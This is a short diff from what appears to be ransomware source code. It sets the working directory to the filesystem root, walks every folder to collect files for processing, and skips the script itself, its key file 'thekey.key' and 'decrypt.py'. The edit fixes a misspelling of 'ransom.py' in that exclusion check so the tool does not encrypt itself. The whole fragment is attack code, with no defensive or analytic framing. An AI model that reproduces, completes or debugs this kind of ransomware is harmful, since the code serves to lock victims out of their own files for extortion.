@@ -7,7 +7,7 @@ rootDir = os.path.abspath(os.sep)
 os.chdir(rootDir)
 for foldername, subfolder, filename in os.walk('.'):
     for file in filename:
-        if file == 'rnasom.py' or file == 'thekey.key' or file == 'decrypt.py':
+        if file == 'ransom.py' or file == 'thekey.key' or file == 'decrypt.py':
             continue
         if os.path.isfile(file):
             files.append(file)
